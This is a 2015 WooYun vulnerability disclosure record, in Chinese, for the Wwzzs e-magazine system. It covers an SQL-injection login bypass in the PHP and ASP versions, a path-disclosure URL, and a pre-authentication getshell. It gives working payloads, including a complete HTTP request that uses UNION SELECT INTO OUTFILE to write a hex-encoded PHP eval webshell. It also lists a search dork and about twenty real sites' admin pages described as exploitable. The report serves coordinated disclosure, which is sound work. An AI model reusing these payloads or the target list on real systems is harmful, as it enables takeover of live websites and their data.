{"id": 39592, "wybug_id": "wooyun-2015-093716", "wybug_title": "万众电子期刊在线阅读系统PHP和ASP最新版本通杀SQL注入&amp;PHP版本getshell（无需登录）", "wybug_corp": "wwzzs.com", "wybug_author": "goubuli", "wybug_date": "2015-02-02 15:03", "wybug_open_date": "2015-05-03 17:50", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射漏洞利用技巧", "源码分析", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-02-02：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-02-02：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-02-05：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-03-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-04-08：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-18：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-05-03：\t细节向公众公开  简要描述： 万众电子期刊在线阅读系统PHP和ASP最新版本1、通杀SQL注入2、PHP版本getshell（无需登录）3、爆网站路径 详细说明：  能不能不走小厂商？1、SQL注入问题，PHP和ASP都通杀！PHP版本：后台登录代码，问题出在校验函数处：对应问题global.fun.php\n//登录判断    function function_login() {        session_start();        function_safety();        $username = function_cleanstr($_POST['username']);        $password = md5($_POST['password']);        $code = md5(strtoupper($_POST['code']));        if ($username == '' or $password == '') {            function_alert('用户名和密码不能为空！', 'index.php');        }        if ($code != $_SESSION['code']) {            function_alert('验证码错误！', 'index.php');        }        if (!_query(\"SELECT * FROM magacms_user WHERE username='$username' AND password='$password' LIMIT 1\")) {            function_alert('用户名和密码错误！', 'index.php');        }        $intime = date('Y-m-d H:i:s', time());        $inip = function_getRealIp();        // setcookie('username',  md5($username)); //采用cookie记忆登录状态        $_SESSION['username'] = $username; //采用session记忆登录状态        _update(\"UPDATE magacms_user SET intime='$intime',inip='$inip' WHERE username='$username'\");        function_alert('', 'admin_main.php');    }\n在获取用户这个参数的时候使用$username = function_cleanstr($_POST['username']);进行了一些简单的过滤，跟踪发现函数function_cleanst只是对参数做了html编码，如下：\n//字符串格式化function function_cleanstr($str) {    $newstr = htmlspecialchars(trim($str)); //删除两侧空格并转码html    return $newstr;}\nhtmlspecialchars只会对<>等HTML标签字符进行过滤，因此对于这个username字段构成了注入，直接代入SELECT * FROM magacms_user WHERE username='$username' AND password='$password' LIMIT 1SQL查询。因此对于任意系统，只需知道用户名即可登录系统。。。\n\n登陆成功。。。\n\n执行的SQL：\n241 Query\tSELECT * FROM magacms_user WHERE username='admin' OR 'A'='A' AND password='0cc175b9c0f1b6a831c399e269772661' LIMIT 1\n\n\nASP版本：代码分析类似跟PHP类似登录提交：admin' or 'a'='a\n\n登陆成功\n\n2、爆网站路径直接提交：/admin/includes/upload.inc.php?action=upfile如图\n\n爆出路径为：E:\\phpStudy\\WWW\\wwzzs\\admin\\includes\\upload.inc.php3、PHP版本getshellPOST提交\nPOST /wwzzs/admin/?action=login HTTP/1.1Host: localhost:808User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://202.113.76.211:808/wwzzs/admin/Cookie: PHPSESSID=923954107451195a03f88567d6fa0accConnection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 183username=admin' and 1=2 UNION SELECT 0x3C3F70687020406576616C28245F504F53545B2741275D293B3F3E,2,3,4,5 into outfile 'E:/phpStudy/WWW/wwzzs/upload/bannerpic/t.php'#&password=a&code=A56M\n访问：http://localhost:808/wwzzs/upload/bannerpic/t.php连接菜刀：\n\n执行的SQL：\n\n\n249 Query\tSELECT * FROM magacms_user WHERE username='admin' and 1=2 UNION SELECT 0x3C3F70687020406576616C28245F504F53545B2741275D293B3F3E,2,3,4,5 into outfile 'E:/phpStudy/WWW/wwzzs/upload/bannerpic/t.php'#' AND password='0cc175b9c0f1b6a831c399e269772661' LIMIT 1\n执行完成。\n\n   漏洞证明：  google搜索特征：Powered by Wwzzs.com!站点非常多。。。\n\n案例（包括PHP和ASP，最新版以及老版本都有）：http://www.gxlzw.com/admin/http://dm.fcshw.cn/admin/admin_main.phphttp://footballbaby.chinawudang.com/kw/admin/admin_main.phphttp://www.new-audiophile.com/admin/http://cp.cyeedu.com:8087/admin/http://202.102.86.212:8089/admin/admin_main.asphttp://www.scjt.cc/yuekan/admin/admin_main.phphttp://www.xibeily.com/zazhi/admin/admin_main.phphttp://ipmtea.com/admin/http://online.chaoyuemedia.cn/admin/http://www.daihaipower.com/ebook/admin/admin_main.phphttp://www.vvyichang.com/dm/admin/http://www.qfzp.com/dm/admin/admin_main.php\t\t提交：admin' ##http://dm.shiqian.tv/admin/admin_main.asphttp://www.808lw.com/w/admin/admin_main.phphttp://www.lincheng365.com/dm/admin/admin_main.phphttp://1.hangsu.wang/admin/admin_main.asphttp://hszba.yn65.com/admin/admin_main.phphttp://dm.wexun.net/admin/admin_main.phphttp://sscsdzb.gotoip2.com/admin/admin_main.php...   修复方案：  后台登录过滤。。。文件访问限制。。。   版权声明：转载请注明来源 goubuli@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-02-02 17:48 厂商回复： 已经紧急修复 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-02-12 20:19 |    \t\tHackBraid  \t\t\t( 核心白帽子 |\t\t\t        Rank:1545 漏洞数:260        | ...........................................)\t\t \n  屌屌屌，学习    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}